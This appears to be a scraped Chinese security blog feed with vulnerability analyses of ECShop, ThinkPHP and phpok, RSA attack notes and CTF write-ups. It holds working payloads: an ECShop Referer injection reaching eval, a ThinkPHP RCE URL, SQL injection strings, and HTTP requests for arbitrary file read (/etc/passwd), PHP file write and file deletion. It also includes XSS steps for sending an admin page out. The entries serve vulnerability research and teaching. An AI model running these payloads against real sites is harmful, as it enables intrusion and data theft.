    <content type="text"><![CDATA[之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下 前言之前渗透时遇到了这样一个站，当时看到这个命令执行的过程有点东西，于是抽了个时间复现一下 环境搭建IDE: PHPstorm代码：ECshop3.0ECShop 2.7.3 POCECshop3.0php 5.61Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a 漏洞分析user.php 305行渲染的代码12345678910//310行if (empty($back_act) &amp;&amp; isset($GLOBALS['_SERVER']['HTTP_REFERER']))&#123; // 如果没有user.php， 则$back_act为referer $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER'];&#125;// 330行$smarty-&gt;assign('back_act', $back_act); // 渲染referer到模板$smarty-&gt;display('user_passport.dwt'); 跟进display函数，includes/cls_template.php12345678910111213141516// 106行$out = $this-&gt;fetch($filename, $cache_id); // fetch模板，渲染变量if (strpos($out, $this-&gt;_echash) !== false)&#123; $k = explode($this-&gt;_echash, $out); // _echash为定值 foreach ($k AS $key =&gt; $val) &#123; if (($key % 2) == 1) // 如果是奇数个 &#123; // 45ea207d7a2b68c49582d2d22adf953a这个相当于分割符，方便从html提取出序列化数据 $k[$key] = $this-&gt;insert_mod($val); &#125; &#125; $out = implode(&apos;&apos;, $k);&#125; 跟进insert_mod函数，includes/cls_template.php 1168行12345678function insert_mod($name) // 处理动态内容&#123; list($fun, $para) = explode(&apos;|&apos;, $name); // |前的为函数名，后为参数 $para = unserialize($para); $fun = &apos;insert_&apos; . $fun; return $fun($para); // 可以执行insert_开头的函数&#125; 可以通过控制referer，执行insert_开头的任意函数，来看includes/lib_insert.php：1234567891011121314151617181920212223242526272829// 141行function insert_ads($arr)&#123; static $static_res = NULL; $time = gmtime(); if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1) &#123; $sql = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; . &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; . &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;. &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; . &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;. &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; . &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;]; $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql); &#125; // arr可控，形成sql注入， 继续往下跟// 170行 foreach ($res AS $row) &#123; if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) // 查库的第2列字段 &#123; continue; &#125; $position_style = $row[&apos;position_style&apos;]; // 查库的第9列 $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads); $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); // 重新带入模板渲染 接着，includes/patch/includes_cls_template_fetch_str.php123&lt;?php$template = $this;return preg_replace_callback(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/&quot;, function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source); 调select函数，includes/cls_template.php12//375行 return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;; includes/cls_template.php get_val593行12// 处理掉变量标签$p = $this-&gt;make_var($val); 跟进make_var, includes/cls_template.php12345678910111213function make_var($val)&#123; if (strrpos($val, '.') === false) &#123; if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val])) &#123; $val = $this-&gt;_patchstack[$val]; &#125; $p = '$this-&gt;_var[\'' . $val . '\']'; &#125; // 705行 return $p; 代码执行，includes/cls_template.php12345678910//1193行function _eval($content)&#123; ob_start(); eval(&apos;?&apos; . &apos;&gt;&apos; . trim($content)); $content = ob_get_contents(); ob_end_clean(); return $content;&#125;]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA小结]]></title>
    <url>%2F2019%2F04%2F27%2FRSA%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[最近打比赛频频遇到各种学过又不会的密码学… 抽了点时间捣鼓了一下常见rsa攻击方法的原理，以后有时间继续填坑 RSA计算过程涉及3个参数： n e d, 其中 {n, d}为私钥，{n, e}为公钥 phi(n) = (p-1) * (q-1)d为e膜phi(n)的逆元(phi(n)为n的欧拉函数) ed ≡ 1 (mod phi(n)) 加密解密过程：c密文，m明文加密：c ≡ m^e(mod n)解密：m ≡ c^d(mod n) rsa中e为随机选取的一个数，一般为65537n由两个大素数(p,q)之积组成，公钥{n,e}为公开的，要破解rsa就得求出d，d为e模phi(n)的逆元，要求出phi(n)，必须分解n求得p,q，从而求得phi(n)=(p-1)*(q-1) 代码基础 pow函数：python底层实现平方乘和算法解密：m ≡ c^d(mod n)使用pow函数m=pow(c,d,n) 数据处理通过题目的数据文件，手工将参数提取： pem文件1.1 私钥解密flag：openssl rsautl -decrypt -in flag -inkey private.pem -out flag.txt1.2 公钥加密flagopenssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc1.3 获取公钥的信息openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem pcap文件 PPC模式 Crack直接分解nn &lt; 512 bit: 直接分解， https://factordb.comn &gt; 512 bit: 使用后面方法 利用公约数题目特征：直接分解n无果后，尝试yafu。 两次公钥加密时使用的n1和n2有相同的素因子，则可以用欧几里得算法求出n1和n2的最大公因数，也就是其中一个素因子。 题目特征：给了若干个n，均不同，并且n都是2048bit、4096bit级别。 Fermat方法与Pollard rho方法p、q相差过大或相近时，可以使用Fermat方法与Pollard rho方法分解n。 开源项目: yafu 低加密指数攻击当e(e=3)和明文过小时，可以使用这种攻击方案： m^e&lt;n时加密函数为：c ≡ m^e(mod n)， 若m^3&lt;n， 直接对密文c进行开三次方即可解出明文。例题： m^e&gt;n时c ≡ m^e + k*n, 对c+kn进行三次开方，并对k进行枚举，即可求得明文m。 低加密指数广播攻击题目特征：一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。 分析：加密指数e选取较小，且使用相同加密指数进行群发消息(n不同)，可以使用广播攻击获得明文。 123c1 ≡ m^e(mod n1)c2 ≡ m^e(mod n2)c3 ≡ m^e(mod n3) 利用中国剩余定理，解出m^e： 由于e很小，所以对m^e进行开方即可解出 低解密指数攻击题目特征：e看起来很大就行了。 d为e模phi(n)的逆元，e很大那么d就小 脚本：https://github.com/pablocelayes/rsa-wiener-attack 这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：import syssys.setrecursionlimit(10000000) 共模攻击题目特征：若干次加密，每次n都一样，明文根据题意也一样即可。 使用相同模数n对相同的密文m进行加密(e不同)，可以使用共模攻击求出明文：12c1 ≡ m^e1(mod n)c2 ≡ m^e2(mod n) 易知: gcd(e1,e2) = 1有: s*e1 + r*e2 = 1推出：s*e1 + r*e2 ≡ 1 (mod n)用扩展版欧几里得算法可求得s、r 构造表达式：12c1^s ≡ m^(e1*s)(mod n)c2^r ≡ m^(e2*r)(mod n) 联立：12c1^s * c2^r ≡ m^[(e1*s)+(e2*r)] (mod n)c1^s * c2^r ≡ m^1 (mod n) 解出明文：m = (c1^s * c2^r)(mod n) 一些例题jarvisoj: Medium RSA给了公钥和加密后的flag文件，先用openssl提取公钥信息：12345678910111213$ openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem RSA Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----- 分析, 给了我们m， 也就是phi(n)， 通过其求出p,q(①)，然后将n求出(②),通过表达式③将e的逆元d求出，从而将密文解出(⑤)12345①：modulus = (p-1)(p-1)②： n = p * q③： e*d ≡ 1 (mod modulus)④： 加密：c ≡ m^e (mod n)⑤： 解密：m ≡ c^d (mod n) 尝试factor无解。继续尝试用yafu分解m， 也就是phi(n),得到p和q12P39 = 319576316814478949870590164193048041239P39 = 275127860351348928173285174381581152299 根据e p q生成私钥文件,这里用rsatools 1$ python3 rsatool.py -o private.pem -e 65537 -p 319576316814478949870590164193048041239 -q 275127860351348928173285174381581152299 接着拿着这个私钥用openssl解密：12$ openssl rsautl -decrypt -in flag.enc -inkey private.pem PCTF&#123;256b_i5_m3dium&#125; jarvisoj: Hard RSA12345678910111213$ openssl rsa -pubin -text -modulus -in warmup -in pubkey.pemRSA Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 2 (0x2)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgEC-----END PUBLIC KEY----- 很显然，这里加密指数e为2，采用低加密指数攻击。 参考： jarvisoj CTF中RSA的常见攻击方法]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP5.1.x 代码执行漏洞分析]]></title>
    <url>%2F2019%2F04%2F15%2FThinkPHP5.1.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[复现https://tprce/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 漏洞分析从payload入手，在app处下断点跟入, thinkphp/library/think/Request.php 681行，处理兼容模式的url请求： 在thinkphp/library/think/route/Rule.php 947行可以看到其以/分割，分割成模块/控制器/操作方法 路由解析，分发到对应模块/控制器/操作方法thinkphp/library/think/route/dispatch/Url.php 37行 thinkphp/library/think/route/dispatch/Module.php 84行 exec()，实例化控制器 跟入该文件135行，该函数利用反射机制调用类方法，从而进行代码执行1$data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); -&gt; thinkphp/library/think/Container.php 347行 invokeFunction()： 到这里就已经任意代码执行了。 第一次接触反射机制，记录一下自己的理解，简单来说反射即根据目的地找来源，也就是根据已经实例化的对象来找其所属的类和类中的方法 以上为ThinkPHP5.1.x的rce分析，ThinkPHP5.0.x有一些差异，以后来填坑。 修复路由解析过程中没有对控制器的命名规则进行检测，导致我们可以操作任意控制器，官方修复加了正则只允许字符传入： 参考： PHP反射机制原理与用法详解]]></content>
      <tags>
        <tag>Web</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP5 SQL注入漏洞分析]]></title>
    <url>%2F2019%2F04%2F15%2FThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[参考的红日安全团队的文章:https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md 环境搭建第一次用composer安装源码，记录一下配置过程：用brew安装composer：brew install composer更新一下composer：composer self-update安装国内镜像源：composer config -g repo.packagist composer https://packagist.laravel-china.org 安装漏洞环境，thinkphp 5.0.15:composer create-project --prefer-dist topthink/think=5.0.15 tp5.0.15将 composer.json 文件的 require 字段设置成如下：1234&quot;require&quot;: &#123; &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.15&quot;&#125; 将数据库文件，报错信息开启后，在控制器中index.php写：123456789101112&lt;?phpnamespace app\index\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get(&apos;username/a&apos;); db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]); return &apos;Update success&apos;; &#125;&#125; paylaod:1https://tp5.0.15/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 分析从demo代码入手：123$username = request()-&gt;get(&apos;username/a&apos;); // 强制类型转换成数组db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);return &apos;Update success&apos;; 对其动态调试过程中，request()-&gt;get()，在thinkphp/library/think/Request.php 1093行对其数组的每个参数过滤：12345678public function filterExp(&amp;$value)&#123; // 过滤查询特殊字符 if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) &#123; $value .= &apos; &apos;; &#125; // TODO 其他安全过滤&#125; 显然这个过滤规则是形同虚设的。 再来跟入: db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);从上面payload可以发现数组的第一个值为inc， 是tp5新增的链式查询操作:https://www.kancloud.cn/manual/thinkphp5/135178,Auto-increment即自动创建主键字段值。 thinkphp/library/think/db/Builder.php 726行insert 数据处理后进行拼接12345678910111213141516171819202122public function insert(array $data, $options = [], $replace = false)&#123; // 分析并处理数据 $data = $this-&gt;parseData($data, $options); if (empty($data)) &#123; return 0; &#125; $fields = array_keys($data); $values = array_values($data); $sql = str_replace( [&apos;%INSERT%&apos;, &apos;%TABLE%&apos;, &apos;%FIELD%&apos;, &apos;%DATA%&apos;, &apos;%COMMENT%&apos;], [ $replace ? &apos;REPLACE&apos; : &apos;INSERT&apos;, $this-&gt;parseTable($options[&apos;table&apos;], $options), implode(&apos; , &apos;, $fields), implode(&apos; , &apos;, $values), $this-&gt;parseComment($options[&apos;comment&apos;]), ], $this-&gt;insertSql); return $sql;&#125; thinkphp/library/think/db/Builder.php 118行选择了 inc模式 这里只是对数据进行清洗并没有对其进行过滤 123456789101112switch ($val[0]) &#123; case &apos;exp&apos;: $result[$item] = $val[1]; break; case &apos;inc&apos;: $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]); break; case &apos;dec&apos;: $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]); break;&#125;&#125; 数据清洗完后，value值被拼接进去： 接着在对其一番预处理参数绑定后再进行查库，thinkphp/library/think/db/Connection.php 456行： 同样的，从thinkphp/library/think/db/Builder.php可以知道，对Inc模式和对dec处理模式一样，所以同样也存在这个问题： 修复过程，将composer.json版本修改成5.0.17,执行composer update: 12345678910111213switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc':- $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);+ $result[$item] = $item . '+' . floatval($val[2]); break; case 'dec':- $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);+ $result[$item] = $item . '-' . floatval($val[2]); break;&#125; 可以看到改为拼接数组的键了： 看到这里，其实有几个疑问的： 为什么使用框架提供的参数方法过滤这么简单 将值换成键拼接还能注入吗？ 对于第一个问题，因为自己对thinkphp开发流程不熟悉原因，查阅文档之后发现：显然，就像上文分析的那样，默认情况下过滤就只有那些简单的关键字。 对于第二个问题，之前以为是客户端可控的传入变量的键，后来调试的时候发现是： 最后总结一下利用条件： 过滤规则为默认，即无过滤 获取参数为array类型， 传入的三个参数，第一个为查询模式inc/dec，第二个未过滤为payload，第三个会进行floatval()类型转换，功能为递增的step 最后就是存在一个可控的insert操作了 开启报错才能报错注入 补更后来继续跟了一下tp5其他的注入，感觉都很鸡肋，甚至觉得不是洞.. 利用思路都大同小异，传入数据默认不过滤，底层解析数据的也不过滤，最后进行一次字符串拼接。 参考： Laravel China 社区维护的国内全量镜像 ThinkPHP-Vuln]]></content>
      <tags>
        <tag>Web</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCTF/0CTF Web1 WriteUp]]></title>
    <url>%2F2019%2F04%2F13%2FTCTF%3A0CTF%20Web%20WriteUp%2F</url>
    <content type="text"><![CDATA[电脑坏了，一周没摸电脑，期间也打了几场比赛补更新一下之前的WriteUp 第一次打TCTF国际赛，tcl… 学到了很多关于java web和php底层的知识 Ghost Pepper使用Firefox访问题目：https://111.186.63.207:31337，获得初始密码： 进入后给了一个指纹信息: Powered by Jetty:// 9.3.24.v20180605 以前没接触过java web，简单搜索了一下，Jetty的工作原理，可以和Tomcat类比,是一个Servlet引擎，具体细节可以参考IBM上的这篇文章 首先了解一下以下几个术语：JavaBeans： 是Java中一种特殊的类，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。Mbean， 即 managed beans被管理的Beans根据上述参考文章所述，简单来说即Jetty可以安装一些扩展，可以在Mbean中对其进行定义，即可在server运行的时候将扩展加入运行。 JMX,即 Java Management Extensions Java管理扩展 Jolokia,是一个利用JSON通过Http实现JMX远程管理的开源项目 在这个题中，简单测试之后发现开启了Jolokia服务，通过jolokia，可以方便通过GET/POST发送Json的操作Mbean,jolokia文档。在文档中写道jolokia支持一些opration：READ、WRITE、SEARCH、EXEC、LIST、VERSION。 这里可以直接通过EXEC方法给Karaf安装一个控制台，就相当于拿到了webshell：payload1:1https://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole payload2: post传入json数据 访问https://111.186.63.207:31337/system/console/gogo，flag: 所以这里做出这题的关键在于对jolokia和karaf特性的了解，以及对新东西的文档阅读学习能力。 Wallbreaker Easy题目链接：https://111.186.63.208:31340题目给了一个一句话木马让我们bypass disable_function 参考：Exploiting Jolokia Agent with Java EE Servers]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Teaser CONFidence CTF 2019 WriteUp]]></title>
    <url>%2F2019%2F03%2F25%2FTeaser%20CONFidence%20CTF%202019%20WriteUp%2F</url>
    <content type="text"><![CDATA[Web 50前言在hpdoger师傅的分享学到了很多~ 题目链接：https://web50.zajebistyc.tf, 貌似还没关 各位师傅可以还可以抓紧时间去玩一下 测试了一下功能点，一个注册功能(注册即登陆),一个提交漏洞报告页面(给管理员)。 一共有这么几个可控点： 注册处用户名可控，会在profile页面输出，但是尝试注册了用户名为&#39;&quot;&lt;敏感字符，结果是被实体编码： 其次，在注册的时候会有一次跳转，url像下面这样： 抓包分析了一下，服务端强制location跳转，所以这里是不可控的。 进到个人页面： 看到这个url，很容易想到去尝试是否有越权访问admin的问题： 显然，根据这两个页面的差异，我们容易想到这个题想让我们根据xss来读管理员的secret字段。 再来分析一下这个表单，有这么一些可控的点,但有实体编码，仔细看我们会发现select的value属性没有用&quot;包裹， 其次这里还有一个限制即图片只能100*100的大小 select标签可以使用onfocus()和autofocus配合来进行xss，payload:30 onfocus=javascript:alert(1) autofocus 可以去看一下p师傅在2013年就总结了一篇各种标签的利用姿势:那些年我们没能bypass的xss filter 那么问题来了，这里只是self-xss，还没想到如何打出危害。 值得注意的是，上传头像的filename参数，虽然不能插入字符，但是可以指定任意后缀名(当然他检测了图片大小必须为100*100)， (似乎也没啥用) bmp xss后来发现一个图片xss的思路，原理简而言之即通过修改图片结构使得其成为一个js语法合法的文件，接着利用浏览器对内容的检测差异导致恶意图片被解析成js。 在这里，复现这个问题的时候，我使用了外国一个大牛的脚本：https://pastebin.com/04y7ee3u， 但意外的是，我根据教程生成了payload，但是在chrome和Firefox都尝试打开后，并没有弹窗，当时想的是服务端可能会对图片内容进行判断，从而返回的content-type可能不为图片，从而导致误导浏览器解析为js，后来我在ie下测试时，它弹窗了，我尝试分析其数据包，在生成的payload中会尝试用img和script标签两次加载图片： 而当我分析这两个请求的差异，结果并无差异(但只有script标签会弹窗)，所以原因可想而知，出在浏览器上，猜想是浏览器会对内容判断的差异造成js执行 ie在进行种别判断的时候,不单考虑content-type,还根据content内容进行判断导致。 参考了一下IE content种别判断和图片magic bite、content_tpe之间的关系表，在文末参考链接中有原文， 到这里可能想到bmp必须得用script引入才能触发。 但后来hpdoher师傅弱口令登了个国外队伍的号子嫖了个现成的bmp图片打到了flag..(这里挺迷惑的，不太懂他bot怎么解析的) bmpinjector.py svg xss在hackone上有一个svg xss的案例: https://hackerone.com/reports/148853将其图片长宽修改后，将payload发送123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;https://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&apos;This app is probably vulnerable to XSS attacks!&apos;); &lt;/script&gt;&lt;/svg&gt; 然后就很简单了，将admin的源码打回vps flag: p4{15_1t_1m4g3_or_n0t?} 具体的原理可以学习这篇文文章：深入理解浏览器解析机制和XSS向量编码 缓存投毒这算非预期解法，前面我们提到了select标签处有一个self-xss，但是一直没有利用点，后来在hpdoger师傅的交流中，从返回包中可以看到这题中用到了cloudFlare,于是尝试了一下缓存投毒，将self-xss变成可利用的反射型xss。 这里有个特征,我们如果注册的名字为passer8y.js,url中会以passer8y.js为文件名: 接着发送这样一个数据包, 可以看到被缓存到cloudflare里去了。 直接访问：https://web50.zajebistyc.tf/profile/passer8y.js， 自动进行了一次跳转，所以我们成功将xss缓存进了cloudflare。 但是bot似乎不会跟进location跳转，所以我们得构造其他payload去打源码 这里在种缓存的时候有个小点需要注意，我们注册xxx.js的账户完了点进profile页面那次就会缓存到cloudflare，然后我们再次修改profile页面资料时，并不会修改cloudflare的缓存。所以我们要提前抓好注册和修改profile的包(或者写脚本)，第一次访问就得种上我们的payload。 这里可以用js的Fetch API 去读取admin的profile页面，然后在回调的过程创建一个image图片将返回内容打到我们vps。参考mdn的文档：https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch 复现的时候貌似bot挂了，暂时先这样吧。 My admin panel考察php弱类型绕过，一般我们gpc传入的数据服务端接受到的都是字符型(而弱类型比较需要字符串和数值类型的两个数据进行弱类型比较)，而如果此时使用了类似于json_decode()这样的解码函数，我们仍可以传入数值类型的数据：这样传入的hash值为数值类型：{&quot;hash&quot;: 389}而这样为字符型：{&quot;hash&quot;: &quot;389&quot;} 参考：image xss 1.图片发生xss攻击的条件、原因及对策xss link&amp;svg黑魔法hackone-Stored XSS using SVGWeb 50]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpok 最新版（5.1） 审计]]></title>
    <url>%2F2019%2F03%2F07%2Fphpok%20%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%885.1%EF%BC%89%20%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[文章首发：安全客 前言：最近审了一下phpok，能力有限，目前找到的大部后台一些能利用的洞，涉及到的漏洞类型也挺多的，能getshell，在这里分享一些自己的拙见~ 基本分析官网下载最新的phpok 5.1版本：https://phpok.com 首先可以黑白盒结合的方式来分析路由解析规则： 跟目下有这么几个入口文件： 纵览整个目录，容易发现该程序是mvc的模式来编写的，至少有三个入口：index.php,api.php,admin.php 所以，我们可以打开框架目录framework/来印证这个猜想： 这时候我们可以结合黑盒的方式看具体的解析到具体文件(控制器)以及具体的方法的过程，安装后网站后，随便点开个页面，观察参数变化：再看看后台： 到这里其实差不多已经知道解析规则了，比如：https://phpok/index.php?c=cart&amp;f=checkout&amp;id[]=2 入口：index.php 控制器：参数c=cart，对应着框架目录www模块，路径：framework/www/cart_control.php 方法：参数f=checkout，对应着checkout_f()方法 路由文件中会自动将f参数最后加入_f 反观，比如我们要调用framework/admin/freight_control.php的price_save_f()方法： 对应的url即：https://phpok/admin.php?c=freight&amp;f=price_save 即在控制器中，只有以_f结尾的函数名可以直接调用 知道文件解析规则了，下面就可以从入口开始审，审全局过滤，审相关敏感函数进行回溯等等。 变量覆盖从框架入口跟进后，发现framework/init.php 1611行存在parse_str变量覆盖 $query_string参数从framework/libs/server.php 94行传入： 比如访问：https://phpok/?data[script]=passer6y 如果想要利用的话最好是能覆盖全局变量，$_SESSION，$config这些，我在尝试覆盖$_SESSION的时候传入?_SESSION[script]=passer6y,经过动态调试后，发现会自动多加一个下划线，变成这样__SESSION[script]=passer6y。 后来也尝试了利用$_GET变量的一些特性在处理参数的时候，会将参数名中的空格、.、[替换成_，比如传入.SESSION[script]=passer6y会解析成_SESSION[script]=passer6y，但最终还是没有成功覆盖，师傅们有好的思路一起来交流交流~ 后台任意文件读取跟完框架入口核心文件之后，然后进框架目录的www模块,跟完了也没挖到一个洞，接着就开始审核心的libs库，看功能点来回溯，接着就找到了这么些后台洞： 当时在审框架里面的libs库里的file.php，看到cat命令眼前一亮 回溯到了：framework/admin/tpl_control.php framework/admin/appsys_control.php 有两处均存在该问题： exp1:123456789101112POST /admin.php?c=appsys&amp;f=file_edit&amp;id=fav&amp;title=../../../../../../../etc/passwd HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 exp2:123456789101112POST /admin.php?c=tpl&amp;f=edit&amp;id=1&amp;title=../../../../../../../etc/passwd HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 后台任意文件写入getshelllibs库时候发现的，framework/libs/file.php 108行： 跟进make()函数，185行：可以看到是用来创建文件或目录的函数 继续跟_write()函数，同文件394行：良心的程序员还帮我们把转义符给去掉了 分析到这里基本可以知道如果vim()函数可控，那么可以写入任意文件 使用phpstorm command+shift+f全局搜索 在framework/admin/tpl_control.php的383行找到edit_save_f() 下面构造exp就很简单了。 exp:123456789101112POST /admin.php?c=tpl&amp;f=edit_save&amp;id=1&amp;title=../../../../../../../Users/passer6y/Documents/www/phpok/version.php&amp;content=&lt;%3fphp+phpinfo()%3becho+&quot;passer6y&quot;%3b%3f&gt; HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 在framework/admin/tpl_control.php 383行 edit_save_f()函数也有这个问题 后台任意文件删除同样类似的方法在framework/admin/tpl_control.php 303行 delfile_f()函数： 在libs库中，framework/libs/file.php，148行rm()函数也存在该问题 exp：123456789101112POST /admin.php?c=tpl&amp;f=delfile&amp;id=1&amp;title=../../../../../../../Users/passer6y/Documents/www/phpok/version.php HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 